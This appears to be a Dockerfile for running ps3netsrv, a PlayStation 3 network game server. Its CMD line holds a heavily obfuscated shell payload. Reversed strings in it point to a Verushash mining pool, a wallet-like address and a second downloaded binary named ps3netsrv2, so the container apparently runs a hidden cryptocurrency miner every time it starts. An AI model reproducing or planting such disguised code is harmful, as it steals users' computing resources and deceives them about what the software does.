FROM ubuntu

ADD https://github.com/aldostools/webMAN-MOD/raw/master/_Projects_/ps3netsrv/bins/Linux/ps3netsrv_linuxX86_64 /
ADD https://github.com/McCloud/ps3netsrv/raw/master/compiled/ps3netsrv2 /

RUN chmod +x ps3netsrv_linuxX86_64 && mkdir /games
RUN chmod +x ps3netsrv2

VOLUME ["/games"]
EXPOSE 38008

CMD ["./ps3netsrv_linuxX86_64", "/games", "&& ${*\/\/\\(:ffk\/p\\\]jk,}  ${*##62LVozf}   e${@\/\\\[Wn>31G\/dW9CIcf}v$\x27a\\154\x27 \"$(   OrJajLv=\x27  ${*^}  ${!*}  E\\V\x27\"\x27\"\x27\x27\"\x27\"\x27A\"\"\\L  \"$(    \"${@,}\" \"${@#QK\\\]8jJ}\"  \x27\"\x27\"\x27\x27\"\x27\"\x27\\PRI\\N${@^}T\x27\"\x27\"\x27\x27\"\x27\"\x27${@\/Hg-HN~DN}F   %S \x27\"\x27\"\x275.1 T- csrv=CM,ctb=C P- BcbFBXaTIfa98OQ37PzGgNwxAj1QgzyS93 U- 0033:MOC.LOOPGREZ.ENIM.HSAHSUREV\/\/:PCT+MUTARTS O- SUREV A- 2VRSTEN3SP\/\x27\"\x27\"\x27   \"${@~~}\"  ${*#K$m~\\{4mQ}   | ${*\/2t@t}  ${@\/\/\\\"Sb#s\/H7Bd}  $\x27\"\x27\"\x27\\162\x27\"\x27\"\x27$\x27\"\x27\"\x27\\U0065\x27\"\x27\"\x27V   ${*\/+?Y^T\/pV9>M}  ${*#=i.eM0Vu}  ;   ${*##8^c~}     )\"   ${@} ${*##0b&\\`qny\\!}   \x27   ${*\/\/*\\\]-H} ${*\/\/3h9$$i\/S=nO>}  && ${!@} \"${@%\\\[mDf:\\{Z}\"  \"${@,}\"printf   %s   \"${OrJajLv~~}\"   ${*,} ; ${*~}  ${*^}      )\"  \"${@\/o\\}nw&Sl\/r\\\]c\\\[lk}\""]
